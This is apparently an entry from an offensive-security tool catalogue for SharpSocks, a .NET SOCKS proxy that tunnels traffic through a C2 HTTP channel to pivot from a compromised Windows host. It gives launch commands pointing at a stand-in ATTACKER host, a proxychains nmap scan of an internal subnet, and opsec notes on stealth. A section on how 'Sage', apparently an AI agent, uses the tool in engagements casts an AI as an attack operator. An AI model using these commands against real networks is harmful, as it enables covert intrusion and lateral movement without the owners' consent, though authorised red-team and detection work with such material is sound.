---
name: SharpSocks
category: command-and-control
subcategories: [socks-proxy, tunneling, pivoting, c2-channel]
tradecraft_tags: [socks5, tunneling, pivoting, dotnet, apollo-runnable, c2-tunnel]
mitre_attack:
  - id: T1572
    name: Protocol Tunneling
source:
  url: https://github.com/nettitude/SharpSocks
  license: Apache-2.0
  maintained: false
binary_type: .net-assembly
binary_filename: SharpSocks.exe
supported_os: [windows]
architecture: [x64]
privilege_required: user
network_required: true
detection_signal: |
  SOCKS proxy creates a persistent TCP listener on the target machine (or a persistent
  outbound connection to the SOCKS server). Long-lived TCP connections with tunneled
  traffic patterns are detectable by network monitoring. SOCKS proxy traffic going
  through an HTTPS C2 channel is harder to detect than a raw TCP SOCKS listener.
usage_examples:
  - description: Start SOCKS5 proxy channel (via C2 HTTP/HTTPS)
    args: "SharpSocks.exe -Uri http://ATTACKER/socks -Beacon 5000 -Key <key>"
  - description: Use the SOCKS channel from attacker side (with proxychains)
    args: "(attacker) proxychains nmap -sT -p 445 192.168.1.0/24"
opsec_notes: |
  SharpSocks tunnels SOCKS traffic through the C2 HTTP/HTTPS channel — there is no
  direct SOCKS listener on the target. The traffic appears as HTTP requests to the C2
  server. This is stealthier than chisel (which creates a direct TCP tunnel). For
  Apollo/Mythic, Athena's built-in socks command is preferred since it integrates
  directly with Mythic's SOCKS proxy handling. SharpSocks is documented for non-Athena
  Apollo contexts or external C2 frameworks.
gotchas: |
  Not actively maintained (~2019). The C2 server component must be running on the
  attacker side (SharpSocks also has a server component). For Mythic-based operations,
  Athena's built-in `socks` command is the maintained, integrated SOCKS proxy. Apollo
  does not have a built-in SOCKS command — SharpSocks via inline_assembly fills this
  gap for Apollo operators.
related_ttps: [chisel, ligolo-ng, athena]
alternatives: [athena-builtin-socks, chisel, ligolo-ng]
common_args:
  -Uri:
    description: C2 server URI for the SOCKS channel
    typical_values: ["http://ATTACKER:8080/socks"]
    required: true
  -Beacon:
    description: Beacon interval in milliseconds
    typical_values: [5000]
  -Key:
    description: Encryption key for the channel
    typical_values: ["<random-key>"]
last_updated: 2026-05-29
---

# SharpSocks

A .NET assembly SOCKS proxy that tunnels traffic through an HTTP/HTTPS C2 channel
rather than creating a direct TCP SOCKS listener. This is the Apollo-compatible
alternative to Athena's built-in socks command — it enables network pivoting from
an Apollo agent.

## Apollo SOCKS Gap

Apollo does not have a built-in SOCKS command. For Apollo operators who need SOCKS
proxy access to the internal network from a compromised host:
1. **SharpSocks** via inline_assembly — tunnels through an external HTTP server
2. **Chisel** (native EXE) — requires upload to disk and process creation
3. **Switch to Athena** — has built-in `socks start <port>` command

## How Sage uses this
For Apollo-only engagements requiring network pivoting:
- SharpSocks via inline_assembly (no disk write for the tool)
- Provides proxychains/SOCKS access to the internal network
- Required when targeting hosts not directly accessible from attacker infrastructure
